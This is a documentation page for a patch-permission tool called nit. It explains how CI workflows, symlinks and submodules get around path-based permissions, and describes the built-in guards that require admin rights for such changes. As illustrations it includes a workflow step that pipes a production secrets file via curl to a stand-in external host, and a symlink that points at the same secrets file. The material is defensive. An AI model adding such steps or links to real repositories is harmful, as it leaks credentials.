---
title: Guards
description: Why write access to a CI workflow is read access to your whole repository — and what nit does about it.
sidebar:
  order: 3
---

Path rules answer *"may this subject change this path?"*.

They do not answer the question that matters just as much: *"does this change
hand the subject a capability the policy withholds?"*

A patch that only ever touches paths its author may write can still walk out with
everything.

## Three ways around a path-based model

### Continuous integration

```yaml title=".github/workflows/ci.yml"
- run: cat secrets/prod.env | curl -X POST -d @- https://elsewhere.example
```

A CI job runs with a **full checkout** and network access. Write access to a
workflow file is therefore read access to the entire repository, laundered
through a machine nobody is watching.

This is the largest hole in any file-path permission model, and closing it is
most of nit's security value.

### Symlinks

```sh
ln -s ../secrets/prod.env src/config.env
```

A symlink is a read of its target, performed by whoever resolves it. Creating one
is an authorization decision, not a content edit — and a model that only compares
path names cannot see it, because the only path in the patch is one the author
may write.

### Submodules and clean/smudge filters

A `.gitmodules` entry pulls in content from outside the repository entirely.
A `.gitattributes` clean or smudge filter runs a command on checkout.

Neither is "editing a file" in any sense a path rule understands.

## What nit does

Certain changes require the **`admin`** action on the path, on top of the ordinary
write requirements.

| Guard | Fires on | Because |
| --- | --- | --- |
| `protected_path` | `.github/`, `.gitlab-ci.yml`, `.gitea/`, `.circleci/`, `Jenkinsfile`, `.gitattributes`, `.gitmodules`, `.nit/`, … | CI runs with a full checkout and can print anything |
| `symlink` | A change producing mode `120000` | A symlink is a read of its target |
| `submodule` | A change producing mode `160000` | It injects content from outside the repository |

The full default list is in the source as `enforce.DefaultProtectedPaths`.

:::caution[These are on by default and cannot be switched off]
There is no setting to disable them, on purpose. Making it switchable would mean
it gets switched off, and the switch would be a line in a configuration file that
nobody reviews.

The way to express an exception is in the bundle, where it is reviewed.
:::

## Granting it

Because guards are expressed as a requirement for `admin`, they need no separate
configuration language. Granting `admin` on `.github/` to a team is an ordinary
rule:

```yaml
- id: platform-owns-ci
  subject: { type: group, id: platform }
  paths: [.github/, .gitattributes, .gitmodules]
  actions: [read, write, create, delete, admin]
  effect: allow
```

## What it looks like when it fires

```sh
mkdir -p .github/workflows && echo 'name: exfiltrate' > .github/workflows/ci.yml
git add -A && git commit -m 'edit CI'
nit push -m 'edit ci'
```

```
nit: the patch touches paths you may not change

  .github/workflows/ci.yml (create)
  .github/workflows/ci.yml (admin)
      guard: protected_path
```

Two denials for one file. The first is the ordinary path rule — no rule grants
this developer `create` there. The second is the guard.

That second line is the one that matters: **even a bundle that gave developers
write access to everything would still hit it.** Guards are a floor, not a
consequence of your rules.

## Why the patch model has to know about modes

Detecting a symlink or a submodule is impossible if you only look at path names.
That is why nit parses a patch into a structure that records the operation, the
file **mode** on both sides, and the kind of entry — blob, symlink or
submodule — rather than just the paths it touches.

A pure rename is a useful edge case: it carries no mode line at all, because the
mode is unchanged from upstream. nit treats that as "introduces nothing", which
is correct and keeps every ordinary rename from tripping the symlink guard.

## The limit worth stating

Guards close the holes that are visible in a patch. They do not close a hole in
your forge configuration.

If a developer can push to the branch directly, none of this applies to them —
they never went through nit. See [Going to production](/guides/production/) for
the three things that have to be true about the forge.

## Next

- [Push and pull](/concepts/push-and-pull/) — where guards run in the sequence.
- [Going to production](/guides/production/) — the forge-side configuration nit
  depends on.
